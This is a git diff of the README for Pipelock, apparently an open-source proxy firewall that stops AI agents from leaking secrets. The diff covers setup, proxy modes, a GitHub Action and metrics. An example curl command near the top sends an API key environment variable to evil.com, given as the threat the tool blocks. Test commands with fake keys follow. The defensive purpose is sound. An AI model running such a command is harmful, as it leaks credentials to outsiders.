@@ -14,7 +14,7 @@
 
 **Open-source firewall for AI agents.** Single binary, zero runtime dependencies.
 
-Your agent has `$ANTHROPIC_API_KEY` in its environment — and shell access. One request is all it takes:
+Your agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:
 
 ```bash
 curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over — unless pipelock is watching
@@ -42,20 +42,47 @@ docker pull ghcr.io/luckypipewrench/pipelock:latest
 go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
 ```
 
-Then:
+**Try the forward proxy (zero code changes):**
+
+```bash
+# 1. Generate a config and enable the forward proxy
+pipelock audit . -o pipelock.yaml
+pipelock generate config --preset balanced > pipelock.yaml
+
+# 2. Start pipelock
+pipelock run --config pipelock.yaml
+
+# 3. Point any agent (or any process) at pipelock
+export HTTPS_PROXY=http://127.0.0.1:8888
+export HTTP_PROXY=http://127.0.0.1:8888
+
+# Now every HTTP request flows through pipelock's scanner.
+# This should be blocked (DLP catches the fake API key):
+curl "https://example.com/?key=sk-ant-api03-fake1234567890"
+```
+
+No SDK, no wrapper, no code changes. If the agent speaks HTTP, pipelock scans it.
+
+<details>
+<summary>Fetch proxy mode (for agents with a dedicated fetch tool)</summary>
 
 ```bash
 # Scan your project and generate a tailored config
-pipelock audit . -o pipelock-suggested.yaml
-# Review the output, then rename when ready:
-mv pipelock-suggested.yaml pipelock.yaml
+pipelock audit . -o pipelock.yaml
 
-# Verify: this should be blocked (exit code 1 = working correctly)
+# Verify: both should be blocked (exit code 1 = working correctly)
 pipelock check --config pipelock.yaml --url "https://pastebin.com/raw/abc123"
+pipelock check --config pipelock.yaml --url "https://example.com/?t=sk-ant-api03-fake1234567890"
 
-# When ready, start the proxy (agents connect to localhost:8888)
+# Start the proxy (agents connect to localhost:8888/fetch?url=...)
 pipelock run --config pipelock.yaml
+
+# For full network isolation (agent can ONLY reach pipelock):
+pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
+docker compose up
 ```
+
+</details>
 
 <details>
 <summary>Verify release integrity (SLSA provenance + SBOM)</summary>
@@ -98,6 +125,8 @@ flowchart LR
     Proxy --> Scanner
     Scanner -- "content or\ntunnel" --> Agent
     Scanner -- "request" --> Web
+    Web -- "response" --> Scanner
+    Scanner -- "clean content" --> Agent
 
     style PRIVILEGED fill:#fee,stroke:#c33
     style FETCH fill:#efe,stroke:#3a3
@@ -130,9 +159,9 @@ flowchart LR
 
 ## Why Pipelock?
 
-| | Pipelock | Scanners (mcp-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
+| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
 |---|---|---|---|---|
-| Secret exfiltration prevention | Yes | No | Partial (domain-level) | Yes |
+| Secret exfiltration prevention | Yes | Partial (proxy mode) | Partial (domain-level) | Yes |
 | DLP + entropy analysis | Yes | No | No | Partial |
 | Prompt injection detection | Yes | Yes | No | No |
 | Workspace integrity monitoring | Yes | No | No | Partial |
@@ -164,7 +193,7 @@ What each mode prevents, detects, or logs:
 | Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
 | Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |
 
-> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains — no web browsing means no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today.
+> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. Pipelock doesn't sandbox processes or restrict syscalls. It's a content inspection layer. For full defense in depth, pair it with an OS sandbox (see [docs/comparison.md](docs/comparison.md)).
 
 ## Features
 
@@ -389,30 +418,39 @@ git_protection:
 - **[LangGraph](docs/guides/langgraph.md)** — `MultiServerMCPClient`, `StateGraph`, Docker deployment
 - Cursor — use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)
 
-## CI/CD Usage
+## GitHub Action
+
+Scan your project for agent security risks on every PR. No Go toolchain needed.
 
 ```yaml
-# .github/workflows/agent-security.yaml
-name: Agent Security
-on: [push]
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - uses: actions/setup-go@v5
-        with:
-          go-version: '1.24'
-      - run: go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
-      - name: Check config
-        run: pipelock check --config pipelock.yaml
-      - name: Scan diff for secrets
-        run: git diff origin/main...HEAD | pipelock git scan-diff --config pipelock.yaml
-      - name: Verify workspace integrity
-        run: pipelock integrity check ./
+# .github/workflows/pipelock.yaml
+- uses: luckyPipewrench/pipelock@v0.2.6
+  with:
+    scan-diff: 'true'
+    fail-on-findings: 'true'
 ```
+
+The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce GitHub annotations inline on the PR diff.
+
+**With a config file:**
+
+```yaml
+- uses: luckyPipewrench/pipelock@v0.2.6
+  with:
+    config: pipelock.yaml
+    test-vectors: 'true'
+```
+
+See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow, or [`examples/ci-workflow-advanced.yaml`](examples/ci-workflow-advanced.yaml) for security score reporting in the job summary.
+
+| Input | Default | Description |
+|-------|---------|-------------|
+| `version` | `latest` | Pipelock version to download |
+| `config` | *(none)* | Path to config file (auto-generates if not set) |
+| `directory` | `.` | Directory to scan |
+| `scan-diff` | `true` | Scan PR diff for leaked secrets |
+| `fail-on-findings` | `true` | Fail if critical findings detected |
+| `test-vectors` | `true` | Validate scanning coverage with built-in tests |
 
 ## Docker
 
@@ -554,13 +592,13 @@ Canonical metrics — updated each release.
 
 | Metric | Value |
 |--------|-------|
-| Go tests (with `-race`) | 2,500+ |
+| Go tests (with `-race`) | 2,600+ |
 | Statement coverage | 96%+ |
 | Evasion techniques tested | 230+ |
-| Scanner pipeline overhead | < 0.005ms/request |
+| Scanner pipeline overhead | ~25μs per URL scan |
 | CI matrix | Go 1.24 + 1.25, CodeQL, golangci-lint |
 | Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
-| OpenSSF Scorecard | 7.8/10 |
+| OpenSSF Scorecard | 8.0/10 |
 
 Run `make test` to verify locally. Full benchmark details: [docs/benchmarks.md](docs/benchmarks.md).
 
@@ -568,13 +606,15 @@ Run `make test` to verify locally. Full benchmark details: [docs/benchmarks.md](
 
 - Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
 - Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
-- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to [mcp-scan (Snyk)](https://github.com/snyk/agent-scan), [Docker MCP Gateway](https://github.com/docker/mcp-gateway), [AIP](https://github.com/ArangoGutierrez/agent-identity-protocol), [agentsh](https://github.com/canyonroad/agentsh), and [srt](https://github.com/anthropic-experimental/sandbox-runtime)
+- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to [Snyk agent-scan](https://github.com/snyk/agent-scan), [Docker MCP Gateway](https://github.com/docker/mcp-gateway), [AIP](https://github.com/ArangoGutierrez/agent-identity-protocol), [agentsh](https://github.com/canyonroad/agentsh), and [srt](https://github.com/anthropic-experimental/sandbox-runtime)
 - Security review contributions from Dylan Corrales
 
-If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock) — it helps others find the project.
+Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+
+If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.
 
 ## License
 
-Apache License 2.0 — Copyright 2026 Josh Waldrep
+Apache License 2.0. Copyright 2026 Joshua Waldrep.
 
 See [LICENSE](LICENSE) for the full text.
